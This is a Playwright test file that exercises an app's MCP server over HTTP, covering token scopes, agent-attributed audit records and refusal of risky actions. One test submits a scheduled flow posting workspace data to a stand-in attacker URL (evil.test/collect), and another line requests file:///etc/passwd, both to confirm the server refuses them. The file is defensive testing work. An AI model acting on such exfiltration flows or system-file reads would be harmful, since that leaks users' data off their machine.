import { test, expect } from '@playwright/test'
import { launchApp, waitForReady, type LaunchedApp } from './_helpers'
import { createServer } from 'node:http'
import { DatabaseSync } from 'node:sqlite'
import { join } from 'node:path'

// The MCP surface, over the wire, against a real running Plexii.
//
// Everything else about this feature is tested with injected fakes, which is
// the right way to test the tools but proves nothing about the bits that only
// exist at runtime: that the /mcp route is mounted, that a real bearer token
// authenticates, that scope reaches the dispatcher from the token rather than
// from a test constant, and that liveWorkspaceDeps wires the real stores. This
// spec speaks JSON-RPC to 127.0.0.1 and checks the answers come from the
// database the app is actually using.

let launched: LaunchedApp | null = null
test.afterEach(async () => {
  if (launched) {
    await launched.dispose()
    launched = null
  }
})

interface Rpc {
  result?: Record<string, unknown>
  error?: { code: number; message: string }
}

// Speak MCP from inside the renderer: it shares the machine with the server,
// and this keeps the whole exchange inside the test process.
async function mcp(
  window: LaunchedApp['window'],
  port: number,
  token: string,
  method: string,
  params?: Record<string, unknown>
): Promise<Rpc> {
  return window.evaluate(
    async ({ port, token, method, params }) => {
      const res = await fetch(`http://127.0.0.1:${port}/mcp`, {
        method: 'POST',
        headers: { 'content-type': 'application/json', Authorization: `Bearer ${token}` },
        body: JSON.stringify({ jsonrpc: '2.0', id: 1, method, params })
      })
      return res.status === 202 ? {} : await res.json()
    },
    { port, token, method, params }
  )
}

/** A port the OS says is free. Asking for 0 via the app is refused
 *  (isValidApiPort demands 1024-65535) and silently leaves the server on the
 *  default 8787 — which is a DEVELOPER'S OWN running Plexii, not this test's.
 *  That mistake makes the whole spec assert against the wrong process, so the
 *  port is chosen here and verified below. */
async function freePort(): Promise<number> {
  const s = createServer()
  await new Promise<void>((r) => s.listen(0, '127.0.0.1', r))
  const { port } = s.address() as { port: number }
  await new Promise<void>((r) => s.close(() => r()))
  return port
}

async function bootServer(
  window: LaunchedApp['window'],
  scopes: Array<'read' | 'write'>
): Promise<{ port: number; token: string; deskId: string }> {
  const wanted = await freePort()
  const out = await window.evaluate(async ({ scopes, wanted }) => {
    const api = (window as unknown as { api: Record<string, any> }).api
    // A desk with real content, so a read proves it reached the database.
    const desk = await api.nodes.create({ parentId: null, kind: 'task', title: 'MCP live desk' })
    await api.widgets.create({
      taskId: desk.id, kind: 'note', title: 'Kickoff notes',
      content: 'The supplier contract is countersigned.', x: 80, y: 80, width: 260, height: 200, color: null
    })
    await api.widgets.create({
      taskId: desk.id, kind: 'voice-recorder', title: 'Supplier call',
      content: JSON.stringify({ transcript: 'Chase the March invoice with Dolan Freight.', durationSec: 9 }),
      x: 380, y: 80, width: 260, height: 200, color: null
    })

    const cfg = await api.apiAccess.setPort(wanted)
    const on = await api.apiAccess.setEnabled(true)
    const status = await api.apiAccess.status()
    const created = await api.apiAccess.createToken('e2e', scopes)
    return {
      port: (status.port ?? on.port ?? cfg.port) as number,
      portError: (cfg.error ?? on.error ?? null) as string | null,
      running: Boolean(status.running ?? on.running),
      token: created.secret as string,
      deskId: desk.id as string
    }
  }, { scopes, wanted })

  // Refuse to run against anything but the instance this test launched.
  expect(out.portError, `the app refused the port: ${out.portError}`).toBeNull()
  expect(out.port, 'the server did not take the port this test chose').toBe(wanted)
  expect(out.running, 'the API server did not come up').toBe(true)
  return { port: out.port, token: out.token, deskId: out.deskId }
}

test('the live /mcp route serves the workspace surface a read token is entitled to', async () => {
  launched = await launchApp()
  const { window } = launched
  await waitForReady(window)
  const { port, token, deskId } = await bootServer(window, ['read'])
  expect(port, 'the API server did not report a port').toBeGreaterThan(0)
  expect(token, 'no raw token came back').toBeTruthy()

  // It is the workspace server, not the old recall-only one.
  const init = await mcp(window, port, token, 'initialize', { protocolVersion: '2025-06-18' })
  expect(init.result?.serverInfo).toMatchObject({ name: 'plexii' })

  const list = await mcp(window, port, token, 'tools/list')
  const names = (list.result!.tools as Array<{ name: string }>).map((t) => t.name)
  expect(names).toContain('plexii_read_desk')
  expect(names).toContain('recall_search')
  // A read token is offered no write tool at all.
  expect(names.filter((n) => n.startsWith('plexii_create'))).toEqual([])
  expect(names).not.toContain('plexii_run_flow')

  // And the data comes from the real database.
  const desk = await mcp(window, port, token, 'tools/call', {
    name: 'plexii_read_desk',
    arguments: { deskId }
  })
  const body = (desk.result!.content as Array<{ text: string }>)[0].text
  expect(body).toContain('MCP live desk')
  expect(body).toContain('The supplier contract is countersigned.')
  expect(body).toContain('Chase the March invoice with Dolan Freight.')
})

test('a real read token is refused a write tool by the live route', async () => {
  launched = await launchApp()
  const { window } = launched
  await waitForReady(window)
  const { port, token } = await bootServer(window, ['read'])

  const r = await mcp(window, port, token, 'tools/call', {
    name: 'plexii_create_desk',
    arguments: { title: 'should not exist' }
  })
  // A protocol-level refusal, not a tool result — the scope came from the
  // token the server hashed, not from anything this test told the dispatcher.
  expect(r.error?.code).toBe(-32602)
  expect(r.error?.message).toContain('write')

  const desks = await window.evaluate(async () => {
    const api = (window as unknown as { api: Record<string, any> }).api
    return (await api.nodes.list()).map((n: { title: string }) => n.title)
  })
  expect(desks).not.toContain('should not exist')
})

test('a bad token gets nothing', async () => {
  launched = await launchApp()
  const { window } = launched
  await waitForReady(window)
  const { port } = await bootServer(window, ['read'])

  const status = await window.evaluate(async (port) => {
    const res = await fetch(`http://127.0.0.1:${port}/mcp`, {
      method: 'POST',
      headers: { 'content-type': 'application/json', Authorization: 'Bearer plx_not_a_real_token' },
      body: JSON.stringify({ jsonrpc: '2.0', id: 1, method: 'tools/list' })
    })
    return res.status
  }, port)
  expect(status).toBe(401)
})

// The round trip that matters: a write token creates a table on a desk, and a
// DIFFERENT tool reads it back off that desk. Two tools agreeing through the
// real database is the proof — a mocked store could satisfy either alone.
test('a write token can build a table on a desk, and read_desk sees it', async () => {
  launched = await launchApp()
  const { window } = launched
  await waitForReady(window)
  const { port, token, deskId } = await bootServer(window, ['write'])

  const made = await mcp(window, port, token, 'tools/call', {
    name: 'plexii_create_table',
    arguments: {
      title: 'GTM enquiries',
      deskId,
      columns: [
        { label: 'Company', type: 'text-short' },
        { label: 'Stage', type: 'single-select', options: ['New', 'Qualified'] }
      ]
    }
  })
  const madeText = (made.result!.content as Array<{ text: string }>)[0].text
  expect(made.result!.isError, madeText).toBeFalsy()
  expect(madeText).toContain('It is on the desk.')
  const tableId = (made.result!.structuredContent as { id: string }).id

  // Fill a row through the tool that could only ever append.
  const row = await mcp(window, port, token, 'tools/call', {
    name: 'plexii_add_table_row',
    arguments: { tableId, cells: { Company: 'Dolan Freight', Stage: 'Qualified' } }
  })
  expect(row.result!.isError, (row.result!.content as Array<{ text: string }>)[0].text).toBeFalsy()

  // Now read the DESK — a different tool, different code path, same database.
  const desk = await mcp(window, port, token, 'tools/call', { name: 'plexii_read_desk', arguments: { deskId } })
  const body = (desk.result!.content as Array<{ text: string }>)[0].text
  expect(body).toContain('GTM enquiries')
  expect(body).toContain('Company | Stage')
  expect(body).toContain('Dolan Freight')

  // And it is really on the canvas, not just in the database.
  const kinds = await window.evaluate(async (id) => {
    const api = (window as unknown as { api: Record<string, any> }).api
    return (await api.widgets.listByTask(id)).map((w: { kind: string }) => w.kind)
  }, deskId)
  expect(kinds).toContain('table')
})

// Edits, against the real stores. A create that works proves less than an edit
// that works: an edit has to find the existing thing, change only what was
// asked, and leave the rest alone.
test('a write token can edit what it created, and read it back changed', async () => {
  launched = await launchApp()
  const { window } = launched
  await waitForReady(window)
  const { port, token, deskId } = await bootServer(window, ['write'])
  const callTool = (name: string, args: Record<string, unknown>) =>
    mcp(window, port, token, 'tools/call', { name, arguments: args })
  const bodyOf = (r: Rpc) => (r.result!.content as Array<{ text: string }>)[0].text

  // Rename the desk.
  const renamed = await callTool('plexii_update_desk', { deskId, title: 'GTM desk' })
  expect(renamed.result!.isError, bodyOf(renamed)).toBeFalsy()

  // A note, then edit its text.
  const made = await callTool('plexii_create_widget', { deskId, content: 'First pass.' })
  const widgetId = (made.result!.structuredContent as { id: string }).id
  const edited = await callTool('plexii_update_widget', { id: widgetId, content: 'Revised after the call.' })
  expect(edited.result!.isError, bodyOf(edited)).toBeFalsy()

  // A browser window ready to load.
  const web = await callTool('plexii_create_widget', {
    deskId, kind: 'webview', title: 'Pricing', content: 'https://example.com/pricing'
  })
  expect(web.result!.isError, bodyOf(web)).toBeFalsy()

  // Read the desk back: the rename, the edit and the URL all land.
  const desk = await callTool('plexii_read_desk', { deskId })
  const body = bodyOf(desk)
  expect(body).toContain('GTM desk')
  expect(body).toContain('Revised after the call.')
  expect(body).not.toContain('First pass.')
  expect(body).toContain('https://example.com/pricing')

  // An edit must not have been a delete-and-recreate.
  const kinds = await window.evaluate(async (id) => {
    const api = (window as unknown as { api: Record<string, any> }).api
    const ws = await api.widgets.listByTask(id)
    return { count: ws.length, ids: ws.map((w: { id: string }) => w.id) }
  }, deskId)
  expect(kinds.ids).toContain(widgetId)
})

// Drafting is allowed. Sending is not, and the two must not blur.
test('a draft lands in the queue and nothing is sent', async () => {
  launched = await launchApp()
  const { window } = launched
  await waitForReady(window)
  const { port, token, deskId } = await bootServer(window, ['write'])

  const r = await mcp(window, port, token, 'tools/call', {
    name: 'plexii_draft_email',
    arguments: { to: 'dana@example.com', subject: 'March invoice', body: 'Chasing the March invoice.', deskId }
  })
  const body = (r.result!.content as Array<{ text: string }>)[0].text
  expect(r.result!.isError, body).toBeFalsy()
  expect(body).toContain('not sent')

  // Work items are a setting, and a fresh profile has them off — the draft must
  // survive that rather than evaporating, and must say where it went.
  const landed = await window.evaluate(async (deskId) => {
    const api = (window as unknown as { api: Record<string, any> }).api
    const items = (await api.nodes.list())
      .filter((n: { kind: string }) => n.kind === 'work_item')
      .map((n: { title: string; intentClass?: string; description?: string }) => ({
        where: 'work_item', title: n.title, intent: n.intentClass, notes: n.description
      }))
    const notes = (await api.widgets.listByTask(deskId))
      .filter((w: { kind: string }) => w.kind === 'note')
      .map((w: { title: string; content: string }) => ({ where: 'note', title: w.title, notes: w.content }))
    return [...items, ...notes]
  }, deskId)

  const draft = landed.find((x: { notes?: string }) => (x.notes ?? '').includes('Chasing the March invoice.'))
  expect(draft, 'the draft reached neither the queue nor the desk').toBeTruthy()
  expect(draft.notes).toContain('To: dana@example.com')
  // Whichever rail it took, the reply said so.
  expect(body).toContain(draft.where === 'work_item' ? 'work item' : 'note on the desk')
})

// The new document types, against the real store. A spreadsheet that saves but
// opens empty is the failure this catches — read_document has to find the rows.
test('every document type it can create round-trips through the real store', async () => {
  launched = await launchApp()
  const { window } = launched
  await waitForReady(window)
  const { port, token, deskId } = await bootServer(window, ['write'])
  const callTool = (name: string, args: Record<string, unknown>) =>
    mcp(window, port, token, 'tools/call', { name, arguments: args })
  const bodyOf = (r: Rpc) => (r.result!.content as Array<{ text: string }>)[0].text

  const sheet = await callTool('plexii_create_document', {
    title: 'Q4 budget', docType: 'sheet', deskId,
    columns: ['Item', 'Cost'], rows: [['Ads', '1200'], ['Video', '800']]
  })
  expect(sheet.result!.isError, bodyOf(sheet)).toBeFalsy()
  const sheetId = (sheet.result!.structuredContent as { id: string }).id
  const readSheet = bodyOf(await callTool('plexii_read_document', { id: sheetId }))
  expect(readSheet).toContain('Item | Cost')
  expect(readSheet).toContain('Ads | 1200')

  const deck = await callTool('plexii_create_document', {
    title: 'Pitch', docType: 'slides', slides: [{ title: 'Why now', bullets: ['Tabs get closed'] }]
  })
  const readDeck = bodyOf(await callTool('plexii_read_document', { id: (deck.result!.structuredContent as { id: string }).id }))
  expect(readDeck).toContain('Why now')
  expect(readDeck).toContain('Tabs get closed')

  const map = await callTool('plexii_create_document', {
    title: 'Approval flow', docType: 'map', nodes: ['Draft', 'Review'], edges: [{ from: 'Draft', to: 'Review' }]
  })
  const readMap = bodyOf(await callTool('plexii_read_document', { id: (map.result!.structuredContent as { id: string }).id }))
  expect(readMap).toContain('Draft')
  expect(readMap).toContain('Review')

  // The sheet is on the canvas as a SHEET, not a doc frame around one.
  const kinds = await window.evaluate(async (id) => {
    const api = (window as unknown as { api: Record<string, any> }).api
    return (await api.widgets.listByTask(id)).map((w: { kind: string }) => w.kind)
  }, deskId)
  expect(kinds).toContain('sheet')
})

// A column rename must not orphan the data underneath it.
test('a renamed column keeps every existing row value', async () => {
  launched = await launchApp()
  const { window } = launched
  await waitForReady(window)
  const { port, token, deskId } = await bootServer(window, ['write'])
  const callTool = (name: string, args: Record<string, unknown>) =>
    mcp(window, port, token, 'tools/call', { name, arguments: args })
  const bodyOf = (r: Rpc) => (r.result!.content as Array<{ text: string }>)[0].text

  const made = await callTool('plexii_create_table', {
    title: 'Leads', deskId, columns: [{ label: 'Company' }, { label: 'Stage' }]
  })
  const tableId = (made.result!.structuredContent as { id: string }).id
  await callTool('plexii_add_table_row', { tableId, cells: { Company: 'Dolan Freight', Stage: 'Demo' } })

  await callTool('plexii_add_table_column', { tableId, label: 'Owner' })
  const renamed = await callTool('plexii_update_table_column', { tableId, column: 'Stage', label: 'Status' })
  expect(renamed.result!.isError, bodyOf(renamed)).toBeFalsy()

  const rows = bodyOf(await callTool('plexii_table_rows', { tableId }))
  expect(rows).toContain('Status')   // the new heading
  expect(rows).toContain('Owner')    // the added column
  expect(rows).toContain('Demo')     // and the value survived the rename
  expect(rows).toContain('Dolan Freight')
})

// The escalation this whole design exists to prevent, tried for real: build a
// scheduled flow that posts the workspace somewhere, and switch it on.
test('a write token cannot arrange for anything to leave the machine', async () => {
  launched = await launchApp()
  const { window } = launched
  await waitForReady(window)
  const { port, token } = await bootServer(window, ['write'])
  const callTool = (name: string, args: Record<string, unknown>) =>
    mcp(window, port, token, 'tools/call', { name, arguments: args })
  const bodyOf = (r: Rpc) => (r.result!.content as Array<{ text: string }>)[0].text

  // Door 1: create it outright.
  const exfil = await callTool('plexii_create_flow', {
    title: 'Nightly exfiltrate', trigger: 'schedule', every: 'hour', enabled: true,
    actions: [{ type: 'http-request', url: 'https://evil.test/collect', method: 'POST', headers: '', body: '{{ai}}' }]
  })
  expect(exfil.result!.isError, bodyOf(exfil)).toBe(true)
  expect(bodyOf(exfil)).toContain('leaves this machine')

  // Door 2: the same by email.
  const mailer = await callTool('plexii_create_flow', {
    title: 'Nightly mailer', trigger: 'schedule', every: 'day',
    actions: [{ type: 'send-email', to: 'x@y.test', subject: 's', body: 'b' }]
  })
  expect(mailer.result!.isError, bodyOf(mailer)).toBe(true)

  // Nothing was written: no flow with either title exists.
  const titles = await window.evaluate(async () => {
    const api = (window as unknown as { api: Record<string, any> }).api
    return (await api.flows.list()).map((f: { title: string }) => f.title)
  })
  expect(titles).not.toContain('Nightly exfiltrate')
  expect(titles).not.toContain('Nightly mailer')

  // Door 3: an internal flow CAN be built, and starts switched off.
  const ok = await callTool('plexii_create_flow', {
    title: 'Nightly tidy', trigger: 'schedule', every: 'day',
    actions: [{ type: 'create-task', title: 'Review the inbox' }]
  })
  expect(ok.result!.isError, bodyOf(ok)).toBeFalsy()
  const made = await window.evaluate(async () => {
    const api = (window as unknown as { api: Record<string, any> }).api
    return (await api.flows.list()).find((f: { title: string }) => f.title === 'Nightly tidy')
  })
  expect(made, 'the internal flow was not created').toBeTruthy()
  expect(made.enabled, 'a new flow must not start running by itself').toBe(false)
})

// Attribution, checked where it actually has to survive: the append-only event
// store on disk. The unit tests prove the hook fires; this proves the row lands
// — and that a person could later ask "what did the AI do here" and be answered.
test('every MCP write leaves an agent-attributed row in the event store', async () => {
  launched = await launchApp()
  const { window, userDataDir } = launched
  await waitForReady(window)
  const { port, token, deskId } = await bootServer(window, ['write'])
  const callTool = (name: string, args: Record<string, unknown>) =>
    mcp(window, port, token, 'tools/call', { name, arguments: args })

  const made = await callTool('plexii_create_widget', { deskId, content: 'Written by the agent.' })
  const widgetId = (made.result!.structuredContent as { id: string }).id
  await callTool('plexii_update_widget', { id: widgetId, content: 'Edited by the agent.' })
  // A refused write must leave NO trace — the record must not claim the AI did
  // something it was stopped from doing.
  await callTool('plexii_create_widget', { deskId: 'not-a-desk', content: 'x' })
  // Reads must leave no trace either.
  await callTool('plexii_read_desk', { deskId })

  // Let the write settle, then read the store the app actually wrote to.
  await window.waitForTimeout(400)
  const db = new DatabaseSync(join(userDataDir, 'focusbuddy.db'), { readOnly: true })
  const rows = db
    .prepare("SELECT actor, object_id, change_summary, source FROM events WHERE actor = ? ORDER BY rowid")
    .all('agent:mcp') as Array<{ actor: string; object_id: string | null; change_summary: string; source: string }>
  db.close()

  // Exactly the two successful writes.
  expect(rows).toHaveLength(2)
  expect(rows.every((r) => r.source === 'mcp')).toBe(true)
  expect(rows[0].change_summary).toContain('plexii_create_widget')
  expect(rows[0].object_id).toBe(widgetId)
  expect(rows[1].change_summary).toContain('plexii_update_widget')
  // Nothing from the refusal or the read.
  expect(rows.some((r) => r.change_summary.includes('not-a-desk'))).toBe(false)
  expect(rows.some((r) => r.change_summary.includes('plexii_read_desk'))).toBe(false)
})

// The thing the whole surface is for: "set this desk up for me". Widgets placed
// where asked, wired together, and readable back — against the real stores.
test('a write token can build AND wire a desk, laid out where it asked', async () => {
  launched = await launchApp()
  const { window } = launched
  await waitForReady(window)
  const { port, token, deskId } = await bootServer(window, ['write'])
  const callTool = (name: string, args: Record<string, unknown>) =>
    mcp(window, port, token, 'tools/call', { name, arguments: args })
  const bodyOf = (r: Rpc) => (r.result!.content as Array<{ text: string }>)[0].text

  const notes = await callTool('plexii_create_widget', {
    deskId, title: 'Call notes', content: 'Dana wants the March invoice chased.', x: 80, y: 80, width: 300, height: 220
  })
  const agent = await callTool('plexii_create_widget', {
    deskId, kind: 'agent', title: 'Summariser', content: 'Pull out anything that needs doing.', x: 440, y: 80
  })
  expect(agent.result!.isError, bodyOf(agent)).toBeFalsy()
  const notesId = (notes.result!.structuredContent as { id: string }).id
  const agentId = (agent.result!.structuredContent as { id: string }).id

  const wire = await callTool('plexii_create_wire', {
    sourceWidgetId: notesId, targetWidgetId: agentId, type: 'transform', verb: 'extract the action items'
  })
  expect(wire.result!.isError, bodyOf(wire)).toBeFalsy()
  expect(bodyOf(wire)).toContain('switched off')

  // It is really wired, and really placed — not just reported as such.
  const listed = bodyOf(await callTool('plexii_list_wires', { deskId }))
  expect(listed).toContain('Call notes')
  expect(listed).toContain('Summariser')
  expect(listed).toContain('"extract the action items"')
  expect(listed).toContain('off')

  const placed = await window.evaluate(async (id) => {
    const api = (window as unknown as { api: Record<string, any> }).api
    const ws = await api.widgets.listByTask(id)
    const links = await api.widgetLinks.listByTask(id)
    return {
      notes: ws.find((w: { title: string }) => w.title === 'Call notes'),
      agentKind: ws.find((w: { title: string }) => w.title === 'Summariser')?.kind,
      linkCount: links.length,
      linkEnabled: links[0]?.enabled
    }
  }, deskId)
  expect(placed.notes.x).toBe(80)
  expect(placed.notes.y).toBe(80)
  expect(placed.notes.width).toBe(300)
  expect(placed.agentKind).toBe('agent')
  expect(placed.linkCount).toBe(1)
  // A reactive wire must not be live the moment it is drawn.
  expect(placed.linkEnabled).toBe(false)

  // Switching it on is a separate, deliberate act — and it works.
  const wireId = (wire.result!.structuredContent as { id: string }).id
  const on = await callTool('plexii_update_wire', { deskId, id: wireId, enabled: true })
  expect(on.result!.isError, bodyOf(on)).toBeFalsy()
  const nowLive = await window.evaluate(async (id) => {
    const api = (window as unknown as { api: Record<string, any> }).api
    return (await api.widgetLinks.listByTask(id))[0]?.enabled
  }, deskId)
  expect(nowLive).toBe(true)
})

// Paging and batching, against a real table with real rows. The unit tests use
// fakes that return arrays; this proves the slice arithmetic survives contact
// with the store and that a walked set of pages sees every row exactly once.
test('a large table pages without gaps, and a batch writes in one call', async () => {
  launched = await launchApp()
  const { window } = launched
  await waitForReady(window)
  const { port, token, deskId } = await bootServer(window, ['write'])
  const callTool = (name: string, args: Record<string, unknown>) =>
    mcp(window, port, token, 'tools/call', { name, arguments: args })
  const bodyOf = (r: Rpc) => (r.result!.content as Array<{ text: string }>)[0].text

  const made = await callTool('plexii_create_table', {
    title: 'Leads', deskId, columns: [{ label: 'Company' }, { label: 'Stage' }]
  })
  const tableId = (made.result!.structuredContent as { id: string }).id

  // 120 rows in ONE call.
  const rows = Array.from({ length: 120 }, (_, i) => ({ Company: `Firm ${i}`, Stage: i % 2 ? 'Demo' : 'New' }))
  const batch = await callTool('plexii_add_table_rows', { tableId, rows })
  expect(batch.result!.isError, bodyOf(batch)).toBeFalsy()
  expect(bodyOf(batch)).toContain('Added 120 of 120')
  expect((batch.result!.structuredContent as { added: number }).added).toBe(120)

  // Walk them back in pages of 50 and check every row is seen exactly once.
  const seen = new Set<string>()
  for (let offset = 0; offset < 200; offset += 50) {
    const pageText = bodyOf(await callTool('plexii_table_rows', { tableId, limit: 50, offset }))
    for (const m of pageText.matchAll(/Firm (\d+)/g)) seen.add(m[1])
    if (!pageText.includes('offset=')) break
  }
  expect(seen.size, 'a page was skipped or repeated').toBe(120)

  // And the first page SAYS there is more, with the offset to use.
  const first = bodyOf(await callTool('plexii_table_rows', { tableId, limit: 50 }))
  expect(first).toContain('of 120')
  expect(first).toContain('offset=50')
})

// Resources, over the wire. This is what a Claude Desktop user would see in an
// attachment picker, so it has to work at the protocol level, not just in a
// unit test with a fake store.
test('resources list and read against a real workspace', async () => {
  launched = await launchApp()
  const { window } = launched
  await waitForReady(window)
  const { port, token, deskId } = await bootServer(window, ['write'])
  const callTool = (name: string, args: Record<string, unknown>) =>
    mcp(window, port, token, 'tools/call', { name, arguments: args })

  // Something worth attaching.
  const doc = await callTool('plexii_create_document', {
    title: 'Launch plan', markdown: '# Plan\n\nShip on Monday.', deskId
  })
  const docId = (doc.result!.structuredContent as { id: string }).id

  const init = await mcp(window, port, token, 'initialize', { protocolVersion: '2025-06-18' })
  expect(init.result!.capabilities).toMatchObject({ resources: {} })

  const listed = await mcp(window, port, token, 'resources/list')
  const resources = listed.result!.resources as Array<{ uri: string; name: string }>
  expect(resources.some((r) => r.uri === `plexii://desk/${deskId}`)).toBe(true)
  expect(resources.some((r) => r.uri === `plexii://document/${docId}`)).toBe(true)

  // Reading the desk resource returns the same content the tool would.
  const read = await mcp(window, port, token, 'resources/read', { uri: `plexii://desk/${deskId}` })
  const contents = read.result!.contents as Array<{ uri: string; text: string; mimeType: string }>
  expect(contents[0].uri).toBe(`plexii://desk/${deskId}`)
  expect(contents[0].text).toContain('MCP live desk')
  expect(contents[0].text).toContain('Chase the March invoice with Dolan Freight.')

  const viaTool = (await callTool('plexii_read_desk', { deskId })).result!.content as Array<{ text: string }>
  // Same extractor both ways — attaching a desk and asking for one must not
  // disagree about what is on it.
  expect(contents[0].text).toContain('Kickoff notes'.slice(0, 0) + 'Supplier call')
  expect(viaTool[0].text).toContain('Supplier call')

  // A uri that names nothing is -32002, not a generic failure.
  const gone = await mcp(window, port, token, 'resources/read', { uri: 'plexii://desk/nope' })
  expect(gone.error?.code).toBe(-32002)
  const foreign = await mcp(window, port, token, 'resources/read', { uri: 'file:///etc/passwd' })
  expect(foreign.error?.code).toBe(-32002)
})
